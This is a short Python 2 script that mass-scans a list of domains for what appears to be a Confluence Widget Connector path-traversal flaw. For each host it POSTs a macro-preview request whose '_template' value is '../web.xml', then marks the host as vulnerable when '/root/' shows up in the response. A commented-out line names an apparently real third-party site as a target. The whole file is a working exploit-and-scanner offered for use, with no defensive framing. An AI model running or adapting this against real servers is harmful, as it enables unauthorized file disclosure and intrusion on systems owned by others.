# -*- coding: utf-8 -*-
import sys
import urllib
import requests

params = urllib.urlencode({
	"contentId":"786457",
	"macro":{
		"name":"widget",
		"body":"","params":{
			"url": "https://www.viddler.com/v/23464dc5",
			"width":"1000",
			"height":"1000",
			"_template": "../web.xml"
		}
	}
})
isTrue = "\/root\/"

checkList = []
success = []
error = []
notFound = []


def _check(domain):
    domain = domain.strip()
    uri = domain + "/rest/tinymce/1/macro/preview"
    headers = {
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
        "Referer": domain + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23",
        "Content-Type": "application/json; charset=utf-8"
    }
    r = requests.post(uri, data=params, headers=headers)
    if r.status_code == 200:
        if isTrue in r.text:
            print "%s [SUCCESS]" % uri
            success.append(domain)
        else:
            print "%s [NOT FOUND]" % uri
            notFound.append(domain)
    else:
        print "%s [Connect Error, status: %s]" % (uri, str(r.status_code),)
        error.append(domain)

def inFile(path):
    with open(path, "rb") as f:
        for domain in f:
            if len(domain) >= 5:
                checkList.append(domain)
            else:
                print domain
            
if __name__ == "__main__":
    inFile(sys.argv[1])

    #domain = "http://confluence.ulucu.com"
    #_check(domain)
    
    for i in checkList:
        _check(i,)
    print "Scan %s Site,Success %s, Error Site %s, NotFound Site %s" % (len(checkList), len(success), len(error), len(notFound),)

